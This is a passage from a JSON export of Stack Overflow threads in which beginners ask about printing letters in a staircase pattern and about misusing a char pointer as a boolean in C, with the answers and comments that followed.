{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1444812695, "post_id": 33120579, "comment_id": 54054507, "body": "Also, you are clearly programming in C, so please remove the C++ tag, a C++ solution could be vastly different from a C solution."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1444813212, "post_id": 33120579, "comment_id": 54054861, "body": "@AndrejLavrin\u010d&#237;k you wrrite &quot;but don&#39;t know how to insert space (i++) on every new line&quot;. Format your text as source code and all speces will be preserved."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1444813360, "post_id": 33120579, "comment_id": 54054972, "body": "<a href=\"http://ideone.com/66wyv6\" rel=\"nofollow noreferrer\">ideone.com/66wyv6</a>"}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1444813422, "post_id": 33120579, "comment_id": 54055010, "body": "<i>&quot;Pls help.jpg&quot;</i> wow"}], "answers": [{"tags": [], "owner": {"reputation": 19499, "user_id": 3883560, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ndXdL.jpg?s=128&g=1", "display_name": "Gopi", "link": "https://stackoverflow.com/users/3883560/gopi"}, "is_accepted": false, "score": 1, "last_activity_date": 1444812992, "last_edit_date": 1444812992, "creation_date": 1444812555, "answer_id": 33120702, "question_id": 33120579, "link": "https://stackoverflow.com/questions/33120579/add-one-more-space-after-each-new-line/33120702#33120702", "title": "Add one more space after each new line", "body": "<p>Use <code>fgets()</code> to read the input.</p>\n\n<p>Remove the <code>\\n</code> character in the read input because <code>fgets()</code> comes with a newline character.</p>\n\n<p>Later print each character in a line</p>\n\n<pre><code>char buf[100];\nint i,j;\nsize_t n;\nfgets(buf,sizeof(buf),stdin);\nn = strlen(buf);\nif(n&gt;0 &amp;&amp; buf[n-1] == '\\n')\nbuf[n-1] = '\\0';\n\nfor(i=0;i&lt;n;i++)\n{\n   j = i;\n   while(j--)\n   printf(\" \");\n   printf(\"%c\\n\",buf[i]);\n}\n</code></pre>\n\n<p>Live Code:<a href=\"http://ideone.com/zfRbO2\" rel=\"nofollow\">http://ideone.com/zfRbO2</a></p>\n"}, {"comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1444812944, "post_id": 33120742, "comment_id": 54054686, "body": "Technically that&#39;s not a valid C++ program, the <code>main</code> function <i>must</i> be declared to return an <code>int</code>. Also, why use arrays that can overflow when there is <code>std::string</code>?"}, {"owner": {"reputation": 127, "user_id": 5416837, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d09174f5ea2731d792111dfee7a00900?s=128&d=identicon&r=PG&f=1", "display_name": "NO-ONE_LEAVES_HERE", "link": "https://stackoverflow.com/users/5416837/no-one-leaves-here"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444814463, "post_id": 33120742, "comment_id": 54055734, "body": "i know what you&#39;re saying but compilers like Dev don&#39;t use exactly the standard form of C++ ... anyway ... thanks for your edit ! :)"}], "tags": [], "owner": {"reputation": 127, "user_id": 5416837, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d09174f5ea2731d792111dfee7a00900?s=128&d=identicon&r=PG&f=1", "display_name": "NO-ONE_LEAVES_HERE", "link": "https://stackoverflow.com/users/5416837/no-one-leaves-here"}, "is_accepted": false, "score": 1, "last_activity_date": 1444812780, "last_edit_date": 1444812780, "creation_date": 1444812655, "answer_id": 33120742, "question_id": 33120579, "link": "https://stackoverflow.com/questions/33120579/add-one-more-space-after-each-new-line/33120742#33120742", "title": "Add one more space after each new line", "body": "<p>here's the code you want ...</p>\n\n<pre><code>    #include &lt;iostream&gt;\n    #define N 20\n    using namespace std;\nmain()\n{\n  char input[N];\n  cout&lt;&lt;\"enter a word:\\n\";\n  cin&gt;&gt;input;\n  for(int i=0,j=1;i&lt;N;i++,j++)\n  {\n    for(k=0;k&lt;j;k++) cout&lt;&lt;\" \";\n    cout&lt;&lt;input[i]&lt;&lt;endl;\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 27011, "user_id": 1490355, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/296f0478cb1b6724e3f862ace601fa99?s=128&d=identicon&r=PG", "display_name": "SingerOfTheFall", "link": "https://stackoverflow.com/users/1490355/singerofthefall"}, "is_accepted": true, "score": 3, "last_activity_date": 1444813059, "last_edit_date": 1444813059, "creation_date": 1444812690, "answer_id": 33120757, "question_id": 33120579, "link": "https://stackoverflow.com/questions/33120579/add-one-more-space-after-each-new-line/33120757#33120757", "title": "Add one more space after each new line", "body": "<p>I know this contradicts what the OP has already done (and I don't know if he has any special requirements, e.g. not using strings), but since the question is tagged with <a href=\"/questions/tagged/c%2b%2b\" class=\"post-tag\" title=\"show questions tagged &#39;c++&#39;\" rel=\"tag\">c++</a>, it can be done much simpler:</p>\n\n<pre><code>using namespace std;\n\nint main()\n{\n    cout &lt;&lt; \"Please enter the string\" &lt;&lt; endl;\n    string in;\n    cin &gt;&gt; in;\n\n    for(string::size_type i = 0; i &lt; in.size(); ++i)\n    {\n        cout &lt;&lt; string(i, ' ') &lt;&lt; in.at(i) &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 47, "user_id": 5075259, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_0YAKJux23M/AAAAAAAAAAI/AAAAAAAADWM/Q2jp3Y7AKDI/photo.jpg?sz=128", "display_name": "Andrej Lavrin\u010d&#237;k", "link": "https://stackoverflow.com/users/5075259/andrej-lavrin%c4%8d%c3%adk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1305, "favorite_count": 0, "accepted_answer_id": 33120757, "answer_count": 3, "score": -2, "last_activity_date": 1444819931, "creation_date": 1444812192, "last_edit_date": 1444819931, "question_id": 33120579, "link": "https://stackoverflow.com/questions/33120579/add-one-more-space-after-each-new-line", "title": "Add one more space after each new line", "body": "<p>How would you do this?\nUser input a word, after pressing <kbd>ENTER</kbd> I want to make a new line before each letter and add one more \"space\" before each letter.</p>\n\n<p>It kinda looks like stairs.</p>\n\n<p><a href=\"http://i.stack.imgur.com/KUF13.png\" rel=\"nofollow\">Pls help.jpg</a></p>\n\n<p>Edit: I\u00b4ve tried this so far</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;conio.h&gt;\n\nint main(){\n\n    char text[100], text2[100];\n    int i = 0, j = 0, count = 0;\n\n    printf(\"Vloz text:\\n\");\n\n    for(i = 0; (text[i]=getchar())!='\\n'; i++)\n    {\n    }        \n    text[i] = '\\0';\n    count = i;\n\n    //vloz space\n    for(i = 0; i&lt;count; i++) {\n        text2[j] = text[i];\n        j++;\n        text2[j] = '\\n';\n        j++;\n    }\n    text2[j] = '\\0';\n\n    printf(\"%s \\n\",text2);                \n\n    getche();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "boolean"], "comments": [{"owner": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 7, "creation_date": 1444811537, "post_id": 33120328, "comment_id": 54053787, "body": "this is, to say the least, very strange code. Why would you assign a bool to a <code>char*</code>?"}, {"owner": {"reputation": 19499, "user_id": 3883560, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ndXdL.jpg?s=128&g=1", "display_name": "Gopi", "link": "https://stackoverflow.com/users/3883560/gopi"}, "edited": false, "score": 4, "creation_date": 1444811579, "post_id": 33120328, "comment_id": 54053813, "body": "Didn&#39;t compiler complain about anything?"}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "edited": false, "score": 0, "creation_date": 1444811712, "post_id": 33120328, "comment_id": 54053880, "body": "can you help me pls i just want to print if the string inside the array is true or false , im just kinda experimenting on my codes"}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 3, "creation_date": 1444811758, "post_id": 33120328, "comment_id": 54053903, "body": "There is no string and no array here."}, {"owner": {"reputation": 1486, "user_id": 1995589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ea9f0cb35e1207eee12b8d79bedc73?s=128&d=identicon&r=PG", "display_name": "John Colanduoni", "link": "https://stackoverflow.com/users/1995589/john-colanduoni"}, "edited": false, "score": 0, "creation_date": 1444811813, "post_id": 33120328, "comment_id": 54053937, "body": "@karlo25 Are there any restrictions on how complicated the expression inside is? Because otherwise you would need to run a C compiler on the string at runtime."}, {"owner": {"reputation": 4940, "user_id": 1673574, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/ubyAU.png?s=128&g=1", "display_name": "Chiel", "link": "https://stackoverflow.com/users/1673574/chiel"}, "edited": false, "score": 0, "creation_date": 1444811925, "post_id": 33120328, "comment_id": 54054010, "body": "My clang compiler refused to compile the code: error: cannot initialize a variable of type &#39;char *&#39; with an rvalue of type &#39;bool&#39;"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1444812064, "post_id": 33120328, "comment_id": 54054095, "body": "The problem can&#39;t be reproduced. If you change the present code to <code>1==2</code> nothing gets printed, like expected."}, {"owner": {"reputation": 1486, "user_id": 1995589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ea9f0cb35e1207eee12b8d79bedc73?s=128&d=identicon&r=PG", "display_name": "John Colanduoni", "link": "https://stackoverflow.com/users/1995589/john-colanduoni"}, "edited": false, "score": 0, "creation_date": 1444812109, "post_id": 33120328, "comment_id": 54054118, "body": "For context, you may want to include some of what you wrote in <a href=\"http://stackoverflow.com/questions/33118130/string-to-boolean-in-c-programming-language\">this</a> similar question of yours, if that is indeed what you are trying to accomplish."}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "edited": false, "score": 0, "creation_date": 1444812157, "post_id": 33120328, "comment_id": 54054151, "body": "help me pls i need it badly , i just want to print if the condition inside my variable array is true or false , i just want to make my array variable a boolean like variable"}, {"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 0, "creation_date": 1444812427, "post_id": 33120328, "comment_id": 54054309, "body": "Array = usually several values. So you want an array of booleans? C does not have booleans per say, basically zero is false and non-zero is true. So you could create an array of int for instance, each of the values would be zero (false) or !=0 (true). You can still use chars, in C a string is actually an array of 1-byte integers. So set a value of 0 at a location in the &quot;string&quot; and that&#39;s &quot;false&quot;, !=0 and that&#39;s &quot;true&quot;."}, {"owner": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 0, "creation_date": 1444812658, "post_id": 33120328, "comment_id": 54054468, "body": "If this is related to your previous question you need to state you are trying to parse a string and evaluate an expression. Your current question is very misleading."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444813362, "post_id": 33120328, "comment_id": 54054975, "body": "<code>char *array = 1==1;</code> --&gt; <code>bool array = 1==1;</code> Better change the name <code>array</code> to something else too."}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444813454, "post_id": 33120328, "comment_id": 54055048, "body": "@cool guy sir but i want to print is if the string type variable is true or false not the boolean type variable helppp"}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444813513, "post_id": 33120328, "comment_id": 54055095, "body": "@karlo25 Is the format of the string always <code>&lt;number&gt;==&lt;number&gt;</code>? Can <code>==</code> be <code>!=</code> or something else? Can <code>&lt;number&gt;</code> be something else?"}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444813666, "post_id": 33120328, "comment_id": 54055203, "body": "@cool guy yes sir it can be also &lt;char&gt;==&lt;char&gt; the condition operator can also change"}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444813920, "post_id": 33120328, "comment_id": 54055369, "body": "Could you specify what all condition operators might be there?"}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444814070, "post_id": 33120328, "comment_id": 54055469, "body": "@cool guy all the condition operator &lt; , &gt; , &lt;= , &gt;= , == , !="}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444814176, "post_id": 33120328, "comment_id": 54055528, "body": "Are there any parenthesis around the data? Like <code>&quot;(1==1)&quot;</code>?"}, {"owner": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444814447, "post_id": 33120328, "comment_id": 54055721, "body": "@CoolGuy: Read they&#39;re previous SO question. They&#39;re trying to parse and evaluate expressions for a school related compiler project. This question is presented  very badly."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "reply_to_user": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 0, "creation_date": 1444814531, "post_id": 33120328, "comment_id": 54055791, "body": "@Blastfurnace I know. I already did. See who edited that post."}, {"owner": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444814749, "post_id": 33120328, "comment_id": 54055945, "body": "@CoolGuy: I didn&#39;t notice that. All the answers below are going off into the weeds because of the terrible  way this is worded."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444815002, "post_id": 33120328, "comment_id": 54056096, "body": "@karlo25 I&#39;m afraid there is no easy way to do this (or maybe is impossible)."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "reply_to_user": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 0, "creation_date": 1444815075, "post_id": 33120328, "comment_id": 54056136, "body": "@Blastfurnace Yes. I agree with you. The OP should&#39;ve worded the question more better including details."}, {"owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444815077, "post_id": 33120328, "comment_id": 54056137, "body": "@cool guy none sir thank you for helping me , the string is like this &quot;1==1&quot; that&#39;s a condition but the compiler seen that as string i just want to print if there is a way if that string is true or false or you can give me a hint"}, {"owner": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 2, "creation_date": 1444815538, "post_id": 33120328, "comment_id": 54056446, "body": "@karlo25: You aren&#39;t going to learn how to write a language interpreter or compiler from a few Stack Overflow questions. Talk you your instructor for guidance."}], "answers": [{"tags": [], "owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "is_accepted": false, "score": 3, "last_activity_date": 1444812331, "last_edit_date": 1444812331, "creation_date": 1444811522, "answer_id": 33120359, "question_id": 33120328, "link": "https://stackoverflow.com/questions/33120328/always-getting-true-in-c/33120359#33120359", "title": "Always getting true in C", "body": "<p>You are checking the pointer itself, not the thing it points to. And it so happens that you initialized the pointer to a non-zero address:</p>\n\n<pre><code>char *array = 1==1; // array has value 1\n</code></pre>\n\n<p>In C everything non-zero is \"truthy\", so a pointer with value <code>1</code> will evaluate to <code>true</code> in a boolean context. </p>\n\n<p>The reason it still has a non-zero address when you do this</p>\n\n<pre><code>if((bool)array == true)\n</code></pre>\n\n<p>is that you never change its value after initialization. You are instead setting the value of the thing it points to here:</p>\n\n<pre><code>*array = 1==2; // write 0 to whatever is at address 1!\n</code></pre>\n\n<p>This does not change the value of <code>array</code> itself. It most likely causes undefined behaviour by writing to an address you shouldn't be writing to.</p>\n"}, {"tags": [], "owner": {"reputation": 37528, "user_id": 987, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/d8eab3888c782573d1bdcbd1616bc3ba?s=128&d=identicon&r=PG", "display_name": "Will Dean", "link": "https://stackoverflow.com/users/987/will-dean"}, "is_accepted": false, "score": 6, "last_activity_date": 1444811877, "creation_date": 1444811877, "answer_id": 33120478, "question_id": 33120328, "link": "https://stackoverflow.com/questions/33120328/always-getting-true-in-c/33120478#33120478", "title": "Always getting true in C", "body": "<p>If you do this:</p>\n\n<pre><code>char *array = 1==2;\n</code></pre>\n\n<p>Then <code>(bool)array</code> <strong>WILL</strong> be false, like you expect, because you've just written an enormously strange way of setting the pointer 'array' to null (zero).</p>\n\n<p>However, if instead, you do </p>\n\n<pre><code>char *array = 1==1;\n*array = 1==2;\n</code></pre>\n\n<p>Then what you've done is initialised <code>array</code> to be a pointer pointing to address '1' and then written a 'false' (zero) to that address.  This will almost certainly crash your program on any modern platform, though on a small embedded platform other things (probably mostly unexpected to you) might happen.</p>\n"}, {"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 0, "last_activity_date": 1444812400, "creation_date": 1444812400, "answer_id": 33120644, "question_id": 33120328, "link": "https://stackoverflow.com/questions/33120328/always-getting-true-in-c/33120644#33120644", "title": "Always getting true in C", "body": "<pre><code>char *array = 1==1;\nif((bool)array == true)\nprintf(\"true\");\n</code></pre>\n\n<p>That throws a compiler warning. Do something like this, instead:</p>\n\n<pre><code>int a = 0;\nif ( a == true )\n   {\n   printf(\"true\");\n   }\nelse\n   {\n   printf(\"false\");\n   }\n</code></pre>\n\n<p>That will return <code>false</code>. Because if you do <code>anything == True</code> the comparison will be true if <code>anything</code> is literally any other value then 0</p>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 2, "last_activity_date": 1444817191, "last_edit_date": 1444817191, "creation_date": 1444812623, "answer_id": 33120728, "question_id": 33120328, "link": "https://stackoverflow.com/questions/33120328/always-getting-true-in-c/33120728#33120728", "title": "Always getting true in C", "body": "<p>The program behaviour is undefined on two counts. The first one being the cast to <code>bool</code>. That's a cast to an unrelated type. The compiler reserves the right to eat your cat.</p>\n\n<p>The second one is more subtle:</p>\n\n<p><code>1==2</code> is an expression with a value 0. (Note that in C++ it is <code>false</code>.)</p>\n\n<p><code>1==1</code> is an expression with a value 1. (Note that in C++ it is <code>true</code>.)</p>\n\n<p>So you are setting a pointer to point to either 0 or 1. As you don't own that memory, even <em>reading</em> the pointer value is undefined, let alone <em>dereferencing</em> it (which you're not attempting).</p>\n"}], "owner": {"reputation": 15, "user_id": 4025107, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e67d99b34e826864687974b44209091?s=128&d=identicon&r=PG&f=1", "display_name": "karlo25", "link": "https://stackoverflow.com/users/4025107/karlo25"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "closed_date": 1444815398, "answer_count": 4, "score": -8, "last_activity_date": 1444847314, "creation_date": 1444811412, "last_edit_date": 1444847314, "question_id": 33120328, "link": "https://stackoverflow.com/questions/33120328/always-getting-true-in-c", "closed_reason": "Not suitable for this site", "title": "Always getting true in C", "body": "<p>Here's my simple program </p>\n\n<pre><code>char *array = 1==1;\nif((bool)array == true)\nprintf(\"true\");\n\nOutput: true\n</code></pre>\n\n<p>But when I change the array in </p>\n\n<pre><code>*array = 1==2;\nOutput: true\n</code></pre>\n\n<p>I don't know why it is always true. I just want to print if the string in variable <code>array</code> is either <code>true</code> or <code>false</code>. </p>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 4191218, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2b6fd763eb32286212d0e72adaf8502?s=128&d=identicon&r=PG&f=1", "display_name": "Morde", "link": "https://stackoverflow.com/users/4191218/morde"}, "edited": false, "score": 0, "creation_date": 1444810010, "post_id": 33119866, "comment_id": 54052949, "body": "Hi, thanks for the comment but I didn&#39;t learn all those stuff you mentioned. If i were constraint to just scanf, how do i do it?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 25, "user_id": 4191218, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2b6fd763eb32286212d0e72adaf8502?s=128&d=identicon&r=PG&f=1", "display_name": "Morde", "link": "https://stackoverflow.com/users/4191218/morde"}, "edited": false, "score": 1, "creation_date": 1444810501, "post_id": 33119866, "comment_id": 54053237, "body": "@Morde <code>scanf</code> is not really designed to do it, but you could perhaps use the <code>&quot;%[^&quot;</code> format (see e.g. <a href=\"http://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow noreferrer\">this <code>scanf</code> and family reference</a>)."}, {"owner": {"reputation": 767708, "user_id": 14860, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vXG1F.png?s=128&g=1", "display_name": "paxdiablo", "link": "https://stackoverflow.com/users/14860/paxdiablo"}, "reply_to_user": {"reputation": 25, "user_id": 4191218, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2b6fd763eb32286212d0e72adaf8502?s=128&d=identicon&r=PG&f=1", "display_name": "Morde", "link": "https://stackoverflow.com/users/4191218/morde"}, "edited": false, "score": 1, "creation_date": 1444811043, "post_id": 33119866, "comment_id": 54053497, "body": "@Morde, if you were really constrained to just <code>scanf</code>, my answer gives one (pretty ugly) method. But, to be honest, if you were constrained that way, I&#39;d be finding out how to get <i>unconstrained!</i>"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 5, "last_activity_date": 1444809795, "creation_date": 1444809795, "answer_id": 